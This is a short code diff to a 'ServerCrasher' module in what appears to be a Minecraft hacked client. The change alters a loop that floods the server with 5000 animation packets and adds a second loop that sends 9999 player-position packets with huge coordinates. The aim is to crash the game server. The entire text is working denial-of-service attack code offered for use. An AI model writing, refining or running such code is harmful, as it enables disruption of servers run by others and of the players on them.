@@ -26,9 +26,15 @@ public final class ServerCrasher extends Mod {
     @Override
     protected void onEnable() {
         for(int i = 0; i <= 5000;i++){
-            mc.thePlayer.sendQueue.addToSendQueue(new Packet18Animation(mc.thePlayer, 1));
+            mc.thePlayer.sendQueue.addToSendQueue(new Packet18Animation(mc.thePlayer,102));
         }
-        mc.thePlayer.addChatMessage("§8[§c§lFDP§6§lClient§8] §fMODE: Swing5K");
+        mc.thePlayer.addChatMessage("§8[§c§lFDP§6§lClient§8] §fStopSleep5000");
+        float index = 0;
+        while (index < 9999) {
+            mc.thePlayer.sendQueue.addToSendQueue(new Packet11PlayerPosition(mc.thePlayer.posX + 9412 * index, mc.thePlayer.posY + 9412 * index,mc.thePlayer.posY + 9412 * index+0.3, mc.thePlayer.posZ + 9412 * index, true));
+                    index++;
+        }
+        mc.thePlayer.addChatMessage("§8[§c§lFDP§6§lClient§8] §toxic position");
         this.toggle();
     }
 
